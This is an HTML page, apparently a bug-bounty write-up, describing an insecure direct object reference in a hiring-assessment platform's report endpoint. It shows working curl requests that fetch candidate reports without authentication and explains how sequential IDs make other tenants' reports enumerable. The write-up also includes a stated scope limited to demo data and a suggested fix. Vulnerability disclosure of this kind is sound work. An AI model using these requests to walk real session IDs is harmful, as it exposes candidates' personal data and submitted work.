@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IDOR in Candidate Report Endpoint - Writeup</title>
+<!-- Fonts & Icons -->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+<style>
+:root {
+--bg-dark: #12161f;
+--card-bg: rgba(22, 28, 39, 0.85);
+--border-color: rgba(255, 255, 255, 0.08);
+--accent-green: #10b981;
+--accent-blue: #58a6ff;
+--accent-red: #ff7b72;
+--accent-yellow: #f2cc60;
+--accent-purple: #d2a8ff;
+--accent-glow: rgba(16, 185, 129, 0.15);
+--text-main: #f1f5f9;
+--text-sub: #94a3b8;
+--font-code: 'Fira Code', monospace;
+--font-sans: 'Inter', sans-serif;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+background-color: var(--bg-dark);
+color: var(--text-main);
+font-family: var(--font-sans);
+line-height: 1.8;
+padding-bottom: 60px;
+}
+
+.navbar {
+border-bottom: 1px solid var(--border-color);
+padding: 16px 0;
+background: rgba(18, 22, 31, 0.9);
+position: sticky;
+top: 0;
+z-index: 100;
+backdrop-filter: blur(8px);
+}
+
+.nav-container {
+max-width: 900px;
+margin: 0 auto;
+padding: 0 20px;
+display: flex;
+justify-content: space-between;
+align-items: center;
+}
+
+.logo {
+font-family: var(--font-code);
+font-weight: 700;
+color: var(--text-main);
+text-decoration: none;
+}
+
+.logo-accent { color: var(--accent-green); }
+
+.back-btn {
+color: var(--accent-green);
+text-decoration: none;
+font-family: var(--font-code);
+font-size: 0.9rem;
+}
+
+.article-container {
+max-width: 850px;
+margin: 40px auto;
+padding: 0 20px;
+}
+
+.article-box {
+background: var(--card-bg);
+border: 1px solid var(--border-color);
+border-radius: 12px;
+padding: 40px;
+box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+}
+
+.article-header {
+border-bottom: 1px solid var(--border-color);
+padding-bottom: 20px;
+margin-bottom: 30px;
+}
+
+.article-title {
+font-size: 1.8rem;
+font-weight: 700;
+line-height: 1.3;
+margin-bottom: 12px;
+}
+
+.article-meta {
+font-size: 0.85rem;
+color: var(--text-sub);
+font-family: var(--font-code);
+display: flex;
+gap: 15px;
+align-items: center;
+flex-wrap: wrap;
+}
+
+.badge { color: var(--accent-green); }
+
+.impact-highlights {
+background: rgba(16, 185, 129, 0.05);
+border-left: 4px solid var(--accent-green);
+padding: 15px 20px;
+margin: 25px 0;
+border-radius: 0 8px 8px 0;
+}
+
+.impact-highlights-warning {
+background: rgba(242, 204, 96, 0.05);
+border-left: 4px solid var(--accent-yellow);
+padding: 15px 20px;
+margin: 25px 0;
+border-radius: 0 8px 8px 0;
+}
+
+.impact-highlights ul {
+list-style: none;
+margin: 0;
+padding: 0;
+}
+
+.impact-highlights li {
+font-family: var(--font-code);
+font-size: 0.93rem;
+color: #e2e8f0;
+margin-bottom: 5px;
+}
+
+.impact-highlights-warning p {
+color: #e2e8f0;
+font-size: 0.95rem;
+margin-bottom: 10px;
+}
+
+.impact-highlights-warning p:last-child { margin-bottom: 0; }
+
+.impact-highlights-warning ul {
+list-style: none;
+margin: 0;
+padding: 0;
+}
+
+.impact-highlights-warning li {
+font-family: var(--font-code);
+font-size: 0.93rem;
+color: #e2e8f0;
+margin-bottom: 8px;
+}
+
+.article-body h2 {
+font-size: 1.3rem;
+font-family: var(--font-code);
+color: var(--accent-green);
+margin: 35px 0 15px 0;
+display: flex;
+align-items: center;
+gap: 10px;
+border-bottom: 1px solid var(--border-color);
+padding-bottom: 8px;
+}
+
+.port-tag {
+background-color: var(--accent-green);
+color: #0d1117;
+padding: 2px 8px;
+border-radius: 4px;
+font-family: var(--font-code);
+font-size: 0.85rem;
+font-weight: 600;
+}
+
+.article-body h3 {
+font-size: 1.05rem;
+font-family: var(--font-code);
+color: var(--accent-purple);
+margin: 20px 0 10px 0;
+}
+
+.article-body p {
+color: #cbd5e1;
+font-size: 0.98rem;
+margin-bottom: 18px;
+}
+
+.terminal-box {
+background: #0d1117;
+border: 1px solid var(--border-color);
+border-radius: 8px;
+padding: 15px 20px;
+font-family: var(--font-code);
+font-size: 0.88rem;
+color: #c9d1d9;
+margin: 20px 0;
+overflow-x: auto;
+white-space: pre-wrap;
+word-break: break-word;
+}
+
+.prompt { color: var(--accent-green); font-weight: bold; }
+.highlight { color: var(--accent-yellow); }
+.vulnerability { color: var(--accent-red); font-weight: bold; }
+
+.table-wrap {
+overflow-x: auto;
+margin: 20px 0;
+}
+
+table {
+width: 100%;
+border-collapse: collapse;
+font-family: var(--font-code);
+font-size: 0.85rem;
+}
+
+th, td {
+text-align: left;
+padding: 10px 14px;
+border-bottom: 1px solid var(--border-color);
+color: #cbd5e1;
+}
+
+th {
+color: var(--accent-purple);
+font-weight: 600;
+}
+
+code {
+font-family: var(--font-code);
+background: rgba(255, 255, 255, 0.06);
+padding: 2px 6px;
+border-radius: 4px;
+color: var(--accent-green);
+font-size: 0.9em;
+}
+
+ul, ol {
+margin-bottom: 18px;
+padding-left: 20px;
+color: #cbd5e1;
+}
+
+li { margin-bottom: 6px; }
+
+@media (max-width: 600px) {
+.article-box { padding: 20px; }
+.article-title { font-size: 1.4rem; }
+}
+</style>
+</head>
+<body>
+<header class="navbar">
+<div class="nav-container">
+            <a href="/index.html" class="logo"><span class="logo-accent">&gt;</span> Back to Writeups </a>
+</div>
+</header>
+
+<div class="article-container">
+<article class="article-box">
+
+<header class="article-header">
+<h1 class="article-title">IDOR in Candidate Report Endpoint Leading to Unauthenticated Cross-Tenant Data Disclosure</h1>
+<div class="article-meta">
+</div>
+</header>
+
+<div class="article-body">
+
+<div class="impact-highlights-warning">
+<p><strong>Overview:</strong> While testing <code>examble.com</code> (CoderPad Screen), I was collecting JS bundles served by the application and reverse-engineering the backend API surface from the webpack modules. I came across an RPC method, <code>Report/findByTestSessionId</code>, that fetches a full candidate assessment report by a numeric session ID. The application also exposes a public demo campaign for prospects to preview reports, which reveals that these session IDs are plain sequential integers. By combining that with the fact that the report endpoint never authenticates the caller, any unauthenticated user can retrieve full candidate reports — name/email, submitted source code, anti-cheat telemetry — across the sequential ID space.</p>
+</div>
+
+<h2><span class="port-tag">RECON</span> Discovery & Analysis</h2>
+
+<p>While hunting on <code>examble.com</code>, I was collecting the JS files served by the application and analyzing them for endpoints and route hints.</p>
+
+<p>Inside the main bundle (<code>app.08b85bea.js</code>, webpack module <code>137427</code> — the <code>Report</code> service wrapper), I found the RPC method that caught my attention:</p>
+
+<div class="terminal-box">async function s(e,t,n){return l.A.call(c,"findByTestSessionId",[e,t],n)}</div>
+
+<p>Combined with the RPC client (module <code>976642</code>) that composes the request URL:</p>
+
+<div class="terminal-box">h = baseUrl + "/work" + "/services/" + service + "/" + method</div>
+
+<p>this revealed the full endpoint path:</p>
+
+<div class="terminal-box">POST https://examble.com/work/services/Report/findByTestSessionId</div>
+
+<p>The naming suggested it fetches a candidate's detailed report by numeric session ID. I hadn't interacted with the API yet, so I checked whether the app exposes any public data that would reveal the ID format. It does:</p>
+
+<div class="terminal-box"><span class="prompt">$</span> curl -s https://examble.com/work/services/Campaign/findDemoCampaignId -d "[]"
+267463
+
+<span class="prompt">$</span> curl -s https://examble.com/work/services/Report/findByCampaignId -d "[267463]"
+{"candidatesReport":[{"name":"Edward B. Finley","email":"ed.finley@bullsphere.com","testSessionId":18911594,...}]}</div>
+
+<p>Key observations from the demo dataset:</p>
+
+<div class="impact-highlights">
+<ul>
+<li>✅ <code>testSessionId</code> is a plain sequential integer (18911544 – 18912589, newer seed 21462893)</li>
+<li>✅ The detailed-report endpoint exists and takes exactly that integer</li>
+<li>✅ A tight numeric range means the identifier space is enumerable, unlike a UUID</li>
+</ul>
+</div>
+
+<h2><span class="port-tag">EXPLOIT</span> Exploitation & Differential Proof</h2>
+
+<h3>Step 1 — Unauthenticated Report Access</h3>
+
+<p>I took a <code>testSessionId</code> from the public demo dataset and sent a request to <code>findByTestSessionId</code> with no session or authorization header at all:</p>
+
+<div class="terminal-box"><span class="prompt">$</span> curl -s https://examble.com/work/services/Report/findByTestSessionId \
+  -H "Content-Type: application/json;charset=UTF-8" \
+  -d "[18911594, null]"</div>
+
+<p>The server returned the full detailed report — <span class="vulnerability">completely unauthenticated</span>:</p>
+
+<div class="terminal-box">{
+  "candidateName": "Edward B. Finley",
+  "email": "ed.finley@bullsphere.com",
+  "questions": [{
+    "response": "&lt;candidate's submitted Java code&gt;",
+    "validator": "..."
+  }],
+  "analysisItems": [{
+    "cheatingProbability": 0.0,
+    "candidateBehavior": {"blurCount": 0, "blurDuration": 0}
+  }],
+  "testSessionId": 18911594
+}</div>
+
+<p>At this point the impact was still qualified — the demonstrated session belongs to CoderPad's intentionally-public demo campaign. So I looked for proof that this is an authorization gap, and not simply "demo data is public."</p>
+
+<h3>Step 2 — Differential Proof: the Backend Can Enforce, But Doesn't Here</h3>
+
+<p>The same service family contains sibling methods that do enforce ownership. I called them against a <strong>non-demo</strong> campaign, with the same no-session setup:</p>
+
+<div class="terminal-box"><span class="prompt">$</span> curl -i -s .../Report/findByCampaignId -d "[267462]"
+<span class="highlight">HTTP/2 403</span> {"code":"ValidUserRequired"}
+
+<span class="prompt">$</span> curl -i -s .../Campaign/findById -d "[267462]"
+<span class="highlight">HTTP/2 403</span> {"code":"NotInOwningCompany"}
+
+<span class="prompt">$</span> curl -i -s .../Report/findByCampaignIdAndCandidateGlobalId -d "[267462, \"00000000-0000-0000-0000-000000000000\"]"
+<span class="vulnerability">HTTP/2 404</span> {"code":"CANDIDATE_NOT_FOUND"}  ← no auth error
+
+<span class="prompt">$</span> curl -i -s .../Report/findByTestSessionId -d "[123, null]"
+<span class="vulnerability">HTTP/2 404</span> {"code":"CANDIDATE_NOT_FOUND"}  ← no auth error</div>
+
+<div class="table-wrap">
+<table>
+<tr><th>Endpoint</th><th>Non-demo input</th><th>Response</th></tr>
+<tr><td>Campaign/findById</td><td>[267462]</td><td>403 NotInOwningCompany</td></tr>
+<tr><td>Report/findByCampaignId</td><td>[267462]</td><td>403 ValidUserRequired</td></tr>
+<tr><td>Report/findByTestSessionId</td><td>[123, null]</td><td>404 CANDIDATE_NOT_FOUND</td></tr>
+<tr><td>Report/findByCampaignIdAndCandidateGlobalId</td><td>[267462, decoy-uuid]</td><td>404 CANDIDATE_NOT_FOUND</td></tr>
+</table>
+</div>
+
+<div class="impact-highlights">
+<ul>
+<li>✅ Sibling endpoints reject non-demo data with 403 (an authorization gate exists)</li>
+<li>✅ The candidate-level fetchers never produce an auth error — invalid or foreign IDs simply yield "not found"</li>
+<li>✅ If a gate existed on these methods, a non-demo ID would 401/403 before the lookup — exactly like the siblings do</li>
+</ul>
+</div>
+
+<h3>Step 3 — Enumerable IDs ⇒ Persistent, Scalable Access</h3>
+
+<p>The final piece is the identifier scheme. <code>testSessionId</code> is an 8–9 digit monotonically increasing integer, with no guessing, no privilege, and no rate limiting observed on the read path during this testing. The ownership scoping seen on campaign-level endpoints (<code>NotInOwningCompany</code>) is entirely absent here.</p>
+
+<p>A user who obtains any one <code>testSessionId</code> — from a shared dashboard link, an invite artifact, or a leaked export — can walk the integer space and read other companies' candidate reports, including submitted code and anti-cheat data, with zero re-authentication, indefinitely.</p>
+
+<div class="impact-highlights">
+<ul>
+<li>Any unauthenticated user can retrieve full candidate reports across tenants ✅</li>
+</ul>
+</div>
+
+<div class="impact-highlights-warning">
+<p><strong>Conclusion:</strong> Since <code>findByTestSessionId</code> (and its sibling <code>findByCampaignIdAndCandidateGlobalId</code>) resolves and returns candidate reports without authenticating or scoping the caller, and since the identifiers are sequential integers, an unauthenticated user can read any candidate's detailed report across tenants. The backend demonstrably possesses the authorization primitives to stop this (<code>ValidUserRequired</code>, <code>NotInOwningCompany</code>) and simply never applies them on these two methods.</p>
+<p><strong>Scope of the proof (stated honestly):</strong> all successful data retrievals used IDs belonging to CoderPad's deliberately-public demo campaign; no real customer candidate was fetched, in order to stay within program rules. The differential above proves the authorization gap exists in code/behavior — the vendor should confirm by repeating Step 1 with a <code>testSessionId</code> generated inside a real (active-plan) campaign.</p>
+<p><strong>Suggested fix:</strong> require an authenticated recruiter session on <code>Report/findByTestSessionId</code> and <code>Report/findByCampaignIdAndCandidateGlobalId</code>; enforce owning-company scoping (the same check used by <code>Campaign/findById</code>); special-case the demo campaign explicitly instead of bypassing auth globally; consider non-sequential, high-entropy test-session identifiers.</p>
+</div>
+
+</div>
+</article>
+</div>
+</body>
+</html>
